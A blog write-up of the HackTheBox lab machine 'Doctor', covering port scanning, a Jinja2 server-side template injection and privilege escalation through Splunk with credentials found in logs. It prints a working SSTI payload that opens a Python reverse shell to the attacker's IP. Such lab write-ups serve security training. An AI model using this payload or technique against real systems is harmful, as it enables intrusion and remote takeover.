---
layout: post
title:  Doctor
categories: hackthebox
tags: [ssti, hackthebox, linux, easy, egotisticalSW]
lang: "en"
image:
    path: assets/images/hackthebox/doctor/preview.png
    width: 300
    height: 300
---

![traceback](../../../../assets/images/hackthebox/doctor/doctor.jpg)

# Abstract

Doctor is a box from [egotisticalSW](https://twitter.com/WhortonMr){:target="_blank"}. To crack the box you have to create a remote code execution using a server side template injection.
To do this, you have to try a few ways to find out which template engine is being used.
Once on the server, you need to thoroughly search the old logs of the web server.
Once you have found what you are looking for, you can use an exploit to gain root access via splunkd.

# Enumeration

## nmap

First I start a quick scan to check which ports are open at all.

As soon as the result is available, I scan more precisely for the relevant ports. This saves a lot of time compared to a full scan.

- **-T5** accelerated
- **-p-** scans all ports

```sh
nmap -T5 -p- 10.10.10.209
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 10:40 EST
Nmap scan report for doctor.htb (10.10.10.209)
Host is up (0.034s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8089/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 62.69 seconds
```

The 3 ports will now be examined in more detail.

- **-sC** additionally runs the nmap default scripts
- **-sV** tries to find out the version of the running service
- **-p** is limited this time only to the open ports found


```sh
nmap -sC -sV -p 22,80,8089 10.10.10.209
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 10:41 EST
Nmap scan report for doctor.htb (10.10.10.209)
Host is up (0.031s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.59 seconds
```

This results in a total runtime of 102.28 seconds.

For comparison, I repeated the second scan with all ports.

```sh
nmap -sC -sV -p- 10.10.10.209
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 10:44 EST
Nmap scan report for doctor.htb (10.10.10.209)
Host is up (0.033s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.23 seconds
```

The result is 160.23 seconds, almost a minute slower than with the other method.

## 22 - SSH

On port 22, the OpenSSH server is running version 8.2p1. 
There are currently no known vulnerabilities for this, so I'll go directly to port 80.

## 80 - HTTP 

Apache 2.4.41 is running on port 80.

### Gobuster

A quick gobuster run doesn't yield anything noticeable at first glance.

```
/about.html (Status: 200) [Size: 19848]
/blog.html (Status: 200) [Size: 19848]
/contact.html (Status: 200) [Size: 19848]
/css (Status: 301) [Size: 306]
/departments.html (Status: 200) [Size: 19848]
/fonts (Status: 301) [Size: 308]
/images (Status: 301) [Size: 309]
/index.html (Status: 200) [Size: 19848]
/index.html (Status: 200) [Size: 19848]
/js (Status: 301) [Size: 305]
/server-status (Status: 403) [Size: 275]
/services.html (Status: 200) [Size: 19848]
```

### Website

The start page does not show anything unusual, except for the fact that the info e-mail address contains a different domain.

Instead of doctor.htb it says doctors.htb. Therefore I add this domain to my `/etc/hosts` and check if there is another webinterface.

![doctor.htb](../../../../assets/images/hackthebox/doctor/0_doctor.htb.png)

A new web page with a login form appears.
Beside the possibility for the login there is a link for the registration.
Since I do not have login credentials I use the registration form.

![doctors.htb](../../../../assets/images/hackthebox/doctor/1_doctors.htb.png)

The form can be filled out quickly with dummy data. 
There is no check if the email address exists or if the password is too short.

![register](../../../../assets/images/hackthebox/doctor/2_register.png)

I have successfully registered.

![register successful](../../../../assets/images/hackthebox/doctor/3_register_successful.png)

After logging in, a rather empty page appears. 
You have the possibility to create new messages via `New Message` or to display your account details.

![login](../../../../assets/images/hackthebox/doctor/4_login.png)

I wrote a message to test.

![Message](../../../../assets/images/hackthebox/doctor/5_Message.png)

The display of my message appears on the page that was visible after login.
This means I can write content on the page and manipulate it that way.
Maybe there is a security hole here.

![Overview](../../../../assets/images/hackthebox/doctor/6_overview.png)

Now that I have an overview of what the page reveals to me, I scan the web server again with ``ffuf``.

Since requests with the extensions .php and .html only return a 404, I decided this time not to use ``-e`` and use file extensions for my wordlist.

```sh
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://doctors.htb/FUZZ
```

The ffuf command returns, among other things, ``archive`` which is an endpoint I have not seen before.

![ffuf](../../../../assets/images/hackthebox/doctor/7_ffuf.png)

The page behind /archive is blank.

![archive](../../../../assets/images/hackthebox/doctor/8_archive.png)

However, the source code of the page provides something very interesting. 
It is an XML document in which my data from the input form reappear.
However, not all of them appear, but only the title that I have assigned to my message.

![archive source](../../../../assets/images/hackthebox/doctor/9_archive_source.png)

It looks like an attack vector can be created here with my input and XML,
but before I go any further and risk stepping into a rabbit hole, I'll take a look at what's running on port 8089.

## 8089 - Splunkd http

On port 8089, the Splunkd application is running version 8.0.5.

![splunkd](../../../../assets/images/hackthebox/doctor/10_splunkd.png)

The version allows authenticated users to execute commands or scripts via the Splunk API.

This means that there is a gateway if you have valid credentials.

However, since I don't currently have them, I'm stuck here.

Information about how this can be exploited can be found here:

[https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/){:target="_blank"}.


# Exploitation

After checking all open ports, the application on doctors.htb on port 80 seems to be the most promising.

Since my entered data is transferred into an XML, there are different scenarios one could try now.

An XXE does not work, because I can only write values into the ``<title>`` field. So I can't create new objects and force a LFI for example.

But there is also the possibility of server side template injections. 
If the XML is created from my input from the frontend with a template engine, I might have the possibility of an RCE.

But for that I have to find out first if and if yes which engine is used.

At:

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection){:target="_blank"}

you can find an overview about the engines and how to attack them.

To find out which engine is running there is an excellent diagram on the page:

![path finder](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Images/serverside.png)

I'm working down the path.

![ssti enum](../../../../assets/images/hackthebox/doctor/11_ssti_enum.png)

To check if it works you also have to look at the archive.

There you can see the first entries exactly as I entered them.

{% raw %}
But you can see that ``{{7*7}}``` became 49 and ``{{7*'7'}}`` became 7777777. 
{% endraw %}

If one now proceeds according to the procedure one comes to the conclusion that it must be either Jinja2 or Twig.

![ssti enum](../../../../assets/images/hackthebox/doctor/12_ssti.png)

Since the graphic says Jinja2 over Twig, I'll start by seeing if I can get anywhere with it.

## jinja2 Framework

On this link [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection){:target="_blank"} you can find the following documentation:

![jinja2](../../../../assets/images/hackthebox/doctor/13_jinja2_documentation.png)

This means that there should be a Python web server running in the background. I verify this again.

The data from the header returns that it is a ``Werkzeug/1.0.1`` webserver, that means there is a Python webserver running.
This is one more indication that the exploit could work.

![python verification](../../../../assets/images/hackthebox/doctor/14_python_verification.png)

Here [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution){:target="_blank"} you can directly find a tutorial for
remote code execution. The payload on the page has to be adapted, otherwise it would just output the content of a flag.txt. But this is not the goal,
I want to create a reverse shell.

For this I start a listener on port 4444 and insert the following code as title in a new message.

{% raw %}
```py
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```
{% endraw %}

Now I update the /archive page and it sends the reverse shell to my system.

So I am now as the user web on the system.

![shell](../../../../assets/images/hackthebox/doctor/15_shell.png)

# privilege escalation

On a new system, I always look first to see if I have access to anything special or if anything else is particularly noticeable.
The user ``web`` is not in the sudo group but in the group ``adm`` and this is quite unusual. Since also in the ``/etc/crontab`` there is nothing
special to find. I first search for files to which the group adm has access in some form.

For this I use the command:

```sh
find / -group adm -exec ls -l {} \; 2>/dev/null
```

A lot of lines are ejected, among others also the logfiles of Apache because they are readable for the adm group. 
So far so inconspicuous, but what catches the eye when reading the output is the file ``/var/log/apache2/backup``.

It seems that someone made a backup on September 17. What could be valuable in there?

![logs](../../../../assets/images/hackthebox/doctor/16_logs.png)

With login forms it can always happen that one is not completely with the thing.
When this happens, it can happen that you write your password in the username field. Admittedly, a bit far-fetched but it can happen.

It should be noted that these requests are POSTS. If you filter the logfile for POST requests, the output becomes manageable.

![log output](../../../../assets/images/hackthebox/doctor/17_output.png)

In this case this is exactly what happened, you find a line where someone tried to reset his password and entered his password instead of his email address.

So now I have the password ``Guitar123``, now I need a username to which this could match. For this I look under /home for the users on the system.

There are the users shaun and web under /home. To change a user you can use the command ``su``, but this does not work in my simple shell, so a shell upgrade is necessary.

This works with

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now you are also able to enter a password.

![shaun](../../../../assets/images/hackthebox/doctor/18_shaun.png)

### Userflag

And with that, the user flag was collected:

![userflag](../../../../assets/images/hackthebox/doctor/19_userflag.png)

## shaun to root

Next I want to become root and for that I have to look around on the system to find out which way leads there.

To do this, I first display all processes and search them for those that run as root.

```sh
ps -ef --forest
```

An old known emerges. The process ``splunkd`` runs as root on port 8089, I have already found an attack vector for it,
but I was missing the user login. This I have now maybe if the user shaun can log in there with his password.
But since he uses the password not only for the input mask on the website but also for his shell account, the probability will be high,
that if he has an account there, this is also operated with the password ``Guitar123``.

![splunkd](../../../../assets/images/hackthebox/doctor/20_splunkd.png)

The SplunkWhisperer can be found here: [https://github.com/cnotin/SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)

With this tool it is possible to execute code with valid credentials and in this case the code is executed as root.

Therefore I first write a small bash script and put it in the /tmp folder. 
I do this to simplify the payload and minimize error sources.

![script](../../../../assets/images/hackthebox/doctor/21_script.png)

Now that the script is in /tmp and executable, I can run the exploit.

![SplunkWhisperer2](../../../../assets/images/hackthebox/doctor/22_exploit.png)

The script successfully connects to Shaun's credentials and the stored script is executed.

### root flag

My Netcat listener gets the signal for an incoming shell and I am root on the system.

![root](../../../../assets/images/hackthebox/doctor/23_root.png)

That's it, I am root on the system.